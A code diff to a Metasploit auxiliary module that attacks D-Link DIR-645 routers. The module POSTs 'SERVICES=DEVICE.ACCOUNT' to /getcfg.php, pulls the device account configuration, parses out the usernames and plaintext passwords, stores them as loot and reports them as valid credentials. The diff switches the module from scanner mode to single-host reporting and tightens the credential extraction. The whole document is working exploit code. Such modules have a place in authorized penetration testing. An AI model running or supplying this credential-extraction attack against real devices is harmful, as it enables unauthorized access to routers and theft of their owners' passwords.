@@ -10,7 +10,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::Scanner
+	include Msf::Auxiliary::Report
 
 	def initialize
 		super(
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
 		)
 	end
 
-	def run_host(ip)
+	def run
 
 		vprint_status("#{rhost}:#{rport} - Trying to access the configuration of the device")
 
@@ -45,10 +45,6 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_cgi({
 				'uri' => '/getcfg.php',
 				'method' => 'POST',
-				#'headers' => {
-				#		'Content-Type' => 'application/x-www-form-urlencoded',
-				#		'Content-Length' => '23',
-				#	},
 				'vars_post' => {
 					'SERVICES' => 'DEVICE.ACCOUNT'
 					}
@@ -58,25 +54,33 @@ class Metasploit3 < Msf::Auxiliary
 			return if (res.headers['Server'].nil? or res.headers['Server'] !~ /DIR-645 Ver 1.0/)
 			return if (res.code == 404)
 
-			#proof of response
-			if res.body =~ /password/
+			if res.body =~ /<password>(.*)<\/password>/
 				print_good("#{rhost}:#{rport} - credentials successfully extracted")
-				vprint_status("#{res.body}")
+				#vprint_status("#{res.body}")
 
-				#store all details as loot -> there is lots of usefull stuff in the response
+				#store all details as loot -> there is some usefull stuff in the response
 				loot = store_loot("account_details.txt","text/plain",rhost, res.body)
 				print_good("#{rhost}:#{rport} - Account details downloaded to: #{loot}")
 
 				res.body.each_line do |line|
-					if line =~ /<password>/
-						line = line.gsub(/<password>/,'')
-						pass = line.gsub(/<\/password>/,'')
-						vprint_good("pass: #{pass}")
+					if line =~ /<name>(.*)<\/name>/
+						@user = $1
+						next
 					end
-					if line =~ /<name>/
-						line = line.gsub(/<name>/,'')
-						user = line.gsub(/<\/name>/,'')
-						vprint_good("user: #{user}")
+					if line =~ /<password>(.*)<\/password>/
+						pass = $1
+						vprint_good("user: #{@user}")
+						vprint_good("pass: #{pass}")
+
+					report_auth_info(
+						:host => rhost,
+						:port => rport,
+						:sname => 'http',
+						:user => @user,
+						:pass => pass,
+						:source_type => "user_supplied",
+						:active => true
+						)
 					end
 				end
 			end
